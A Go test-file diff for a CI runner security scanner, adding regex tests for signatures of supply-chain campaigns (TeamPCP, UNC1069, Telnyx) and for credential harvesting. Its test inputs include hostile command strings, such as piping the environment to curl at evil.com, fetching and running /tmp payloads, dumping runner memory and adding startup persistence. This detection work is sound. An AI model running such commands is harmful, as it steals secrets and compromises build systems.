@@ -8,6 +8,7 @@ import (
 	"strings"
 	"testing"
 
+	runnerguard "github.com/Vigilant-LLC/runner-guard"
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 	"github.com/Vigilant-LLC/runner-guard/internal/parser"
@@ -756,4 +757,135 @@ func TestSignatureRegexCompilation(t *testing.T) {
 		assert.Equal(t, tt.match, re.MatchString(tt.input),
 			"pattern %q against %q", tt.pattern, tt.input)
 	}
+}
+
+func TestSignatureRegexCompilation_TeamPCP(t *testing.T) {
+	patterns := []struct {
+		name    string
+		pattern string
+		input   string
+		match   bool
+	}{
+		// C2 domains
+		{"aqua typosquat", `(?i)scan\.aquasecur[ti]iy?\.org|aquasecur[ti]iy?\.org`, "curl scan.aquasecurtiy.org/payload", true},
+		{"aqua typosquat no match", `(?i)scan\.aquasecur[ti]iy?\.org|aquasecur[ti]iy?\.org`, "curl aquasecurity.com/docs", false},
+		{"checkmarx zone", `(?i)checkmarx\[?\.]?zone|checkmarx\.zone`, "exfil to checkmarx.zone", true},
+		{"checkmarx zone defanged", `(?i)checkmarx\[?\.]?zone|checkmarx\.zone`, "exfil to checkmarx[.]zone", true},
+		{"litellm c2", `(?i)models\.litellm\.cloud`, "curl models.litellm.cloud/api", true},
+		{"telnyx c2 ip", `83\.142\.209\.203`, "wget http://83.142.209.203:8080/payload", true},
+
+		// Behavioral
+		{"tpcp archive", `(?i)tpcp\.tar\.gz|tpcp[-_]?archive|TeamPCP.*Cloud.*[Ss]tealer`, "tar czf tpcp.tar.gz /tmp/creds", true},
+		{"proc mem read", `(?i)/proc/[0-9]+/mem|/proc/self/mem|Runner\.Worker.*mem|dump.*Runner\.Worker`, "cat /proc/1234/mem > dump", true},
+		{"runner worker", `(?i)/proc/[0-9]+/mem|/proc/self/mem|Runner\.Worker.*mem|dump.*Runner\.Worker`, "dump Runner.Worker process memory", true},
+		{"tag force push", `(?i)git\s+tag\s+-f|git\s+push\s+.*--force.*tags|git\s+push\s+--tags\s+--force`, "git push --tags --force origin", true},
+		{"clean git tag", `(?i)git\s+tag\s+-f|git\s+push\s+.*--force.*tags|git\s+push\s+--tags\s+--force`, "git tag v1.0.0", false},
+		{"github release exfil", `(?i)tpcp-docs.*release|gh\s+release\s+create.*tpcp`, "gh release create tpcp-v1 stolen-data.tar.gz", true},
+
+		// Package
+		{"compromised trivy", `(?i)trivy@0\.69\.4|trivy-action.*malicious|setup-trivy.*compromised`, "uses: aquasecurity/trivy-action@0.69.4", false},
+	}
+
+	for _, tt := range patterns {
+		t.Run(tt.name, func(t *testing.T) {
+			re, err := regexp.Compile(tt.pattern)
+			require.NoError(t, err, "pattern %q should compile", tt.pattern)
+			assert.Equal(t, tt.match, re.MatchString(tt.input),
+				"pattern %q against %q", tt.pattern, tt.input)
+		})
+	}
+}
+
+func TestSignatureRegexCompilation_UNC1069(t *testing.T) {
+	patterns := []struct {
+		name    string
+		pattern string
+		input   string
+		match   bool
+	}{
+		// C2 domain
+		{"sfrclak domain", `(?i)sfrclak\[?\.]?com|sfrclak\.com`, "curl https://sfrclak.com:8000/collect", true},
+		{"sfrclak defanged", `(?i)sfrclak\[?\.]?com|sfrclak\.com`, "block sfrclak[.]com at firewall", true},
+		{"sfrclak no match", `(?i)sfrclak\[?\.]?com|sfrclak\.com`, "curl https://example.com", false},
+
+		// Package
+		{"plain-crypto-js", `(?i)\bplain-crypto-js\b|plain[-_]crypto[-_]js`, "npm install plain-crypto-js", true},
+		{"plain-crypto-js in lockfile", `(?i)\bplain-crypto-js\b|plain[-_]crypto[-_]js`, "resolved plain-crypto-js@4.2.1", true},
+		{"legit crypto-js", `(?i)\bplain-crypto-js\b|plain[-_]crypto[-_]js`, "npm install crypto-js", false},
+		{"compromised axios 1", `(?i)axios@1\.14\.1|axios@0\.30\.4`, "axios@1.14.1 in package-lock.json", true},
+		{"compromised axios 2", `(?i)axios@1\.14\.1|axios@0\.30\.4`, "axios@0.30.4 resolved", true},
+		{"clean axios", `(?i)axios@1\.14\.1|axios@0\.30\.4`, "axios@1.14.0 installed", false},
+
+		// Behavioral
+		{"postinstall chain", `(?i)postinstall.*base64.*decode|base64.*decode.*tmp.*exec.*rm|base64.*decode.*temp.*exec.*del`, "postinstall script runs base64 decode to /tmp and exec", true},
+		{"temp exec delete", `(?i)(mktemp|/tmp/|\\$TEMP|%TEMP%).*&&.*(sh\b|bash\b|powershell|pwsh).*&&.*(rm\s+-|del\s+|Remove-Item)`, "/tmp/payload && bash /tmp/payload && rm -f /tmp/payload", true},
+		{"clean build", `(?i)postinstall.*base64.*decode|base64.*decode.*tmp.*exec.*rm|base64.*decode.*temp.*exec.*del`, "npm run build", false},
+	}
+
+	for _, tt := range patterns {
+		t.Run(tt.name, func(t *testing.T) {
+			re, err := regexp.Compile(tt.pattern)
+			require.NoError(t, err, "pattern %q should compile", tt.pattern)
+			assert.Equal(t, tt.match, re.MatchString(tt.input),
+				"pattern %q against %q", tt.pattern, tt.input)
+		})
+	}
+}
+
+func TestSignatureRegexCompilation_Telnyx(t *testing.T) {
+	patterns := []struct {
+		name    string
+		pattern string
+		input   string
+		match   bool
+	}{
+		{"wav steganography", `(?i)\.wav.*\bread\b.*\bbinary\b|\.wav.*struct\.unpack|wave\.open.*\bframes\b.*decode`, "wave.open('payload.wav') frames decode", true},
+		{"startup persistence", `(?i)AppData.*\\Microsoft\\Windows\\Start Menu\\Programs\\Startup|~/\.config/autostart`, `copy payload.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"`, true},
+		{"linux autostart", `(?i)AppData.*\\Microsoft\\Windows\\Start Menu\\Programs\\Startup|~/\.config/autostart`, "cp agent ~/.config/autostart/", true},
+		{"hidden persistence", `(?i)/tmp/\.telnyx|/var/tmp/\.[a-z]{5,}|%LOCALAPPDATA%\\\.[a-z]{5,}`, "mkdir -p /tmp/.telnyx", true},
+		{"aes rsa exfil", `(?i)AES.*256.*CBC.*RSA.*OAEP|RSA.*4096.*tpcp|OAEP.*encrypt.*tar\.gz`, "encrypt with AES 256 CBC then RSA OAEP wrap", true},
+		{"compromised telnyx", `(?i)telnyx==4\.87\.1|telnyx==4\.87\.2|telnyx@4\.87\.[12]`, "telnyx==4.87.1 in requirements.txt", true},
+		{"clean telnyx", `(?i)telnyx==4\.87\.1|telnyx==4\.87\.2|telnyx@4\.87\.[12]`, "telnyx==4.86.0", false},
+	}
+
+	for _, tt := range patterns {
+		t.Run(tt.name, func(t *testing.T) {
+			re, err := regexp.Compile(tt.pattern)
+			require.NoError(t, err, "pattern %q should compile", tt.pattern)
+			assert.Equal(t, tt.match, re.MatchString(tt.input),
+				"pattern %q against %q", tt.pattern, tt.input)
+		})
+	}
+}
+
+func TestSignatureRegexCompilation_SupplyChainGeneral(t *testing.T) {
+	patterns := []struct {
+		name    string
+		pattern string
+		input   string
+		match   bool
+	}{
+		{"env harvest to file", `(?i)(printenv|\benv\b|\bset\b)\s*>\s*[a-z/]|\benv\b.*\|.*(curl|wget|nc\b)`, "printenv > /tmp/creds.txt", true},
+		{"env pipe to curl", `(?i)(printenv|\benv\b|\bset\b)\s*>\s*[a-z/]|\benv\b.*\|.*(curl|wget|nc\b)`, "env | curl -X POST -d @- https://evil.com", true},
+		{"clean env usage", `(?i)(printenv|\benv\b|\bset\b)\s*>\s*[a-z/]|\benv\b.*\|.*(curl|wget|nc\b)`, "echo $GITHUB_TOKEN", false},
+	}
+
+	for _, tt := range patterns {
+		t.Run(tt.name, func(t *testing.T) {
+			re, err := regexp.Compile(tt.pattern)
+			require.NoError(t, err, "pattern %q should compile", tt.pattern)
+			assert.Equal(t, tt.match, re.MatchString(tt.input),
+				"pattern %q against %q", tt.pattern, tt.input)
+		})
+	}
+}
+
+func TestLoadSignaturesFromDirectory(t *testing.T) {
+	// Verify the engine loads signatures from the directory structure.
+	engine, err := NewEngine(runnerguard.RulesFS)
+	require.NoError(t, err)
+	// We should have signatures from all campaign files loaded.
+	// GlassWorm (6) + Cryptojacking (2) + Supply-Chain-General (3) + TeamPCP (9) + UNC1069 (6) + Telnyx (5) = 31
+	assert.GreaterOrEqual(t, len(engine.signatures), 25,
+		"engine should load at least 25 signatures from directory, got %d", len(engine.signatures))
 }
